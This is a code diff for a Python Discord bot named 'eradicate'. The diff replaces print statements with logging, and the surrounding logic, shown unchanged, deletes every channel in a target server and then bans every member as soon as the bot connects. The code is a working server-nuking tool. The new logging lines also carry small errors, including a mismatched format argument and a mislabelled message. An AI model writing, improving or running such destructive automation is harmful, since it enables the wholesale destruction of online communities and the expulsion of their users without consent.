@@ -1,8 +1,16 @@
 import discord
+import logging
 from discord.ext import commands
 
 from config import TOKEN, GUILD_ID
 
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
+
+logger = logging.getLogger("eradicate")
 
 intents = discord.Intents.default()
 intents.guilds = True
@@ -36,39 +44,40 @@ async def get_all_members(guild: discord.Guild):
 
 @bot.event
 async def on_ready():
-    print(f"Connected as {bot.user}")
+    logger.info("Connected as %s", bot.user)
 
     try:
         guild = await get_target_guild()
-        print(f"Target server: {guild.name} ({guild.id})")
+        logger.info("Target server: %s (%s)", guild.name, guild.id)
+
         channels = guild.channels
-        print(f"{len(channels)} channels found:")
+        logger.info("%s channels found", len(channels))
 
         for channel in channels:
             try:
-                print(f"Processing: {channel.name} ({channel.id})")
+                logger.info("Processing channel: %s (%s)", channel.name, channel.id)
                 await channel.delete(reason="Delete")
 
             except discord.Forbidden:
-                print(f"Skipped (missing permissions): {channel.name}")
+                logger.warning("Skipped channel (missing permissions): %s", channel.name)
 
             except discord.HTTPException as error:
-                print(f"Failed: {channel.name} | {error}")
+                logger.error("Failed channel: %s | %s", channel.name, error)
 
         members = await get_all_members(guild)
         for member in members:
             try:
                 await guild.ban(member, reason="Ban")
-                print(f"Success: {member} ({member.id})")
+                logger.info("Member found: %s (%s)", member, member.id)
 
             except discord.Forbidden:
-                print(f"Skipped (missing permissions): {member} ({member.id})")
+                logger.warning("Skipped member (missing permissions): %s", member, member.id)
 
             except discord.HTTPException as error:
-                print(f"Failed: {member} ({member.id}) | {error}")
+                logger.error("Failed channel: %s | %s", member, error)
 
     except RuntimeError as error:
-        print(f"ERROR: {error}")
+        logger.error("ERROR: %s", error)
 
 
 if __name__ == "__main__":
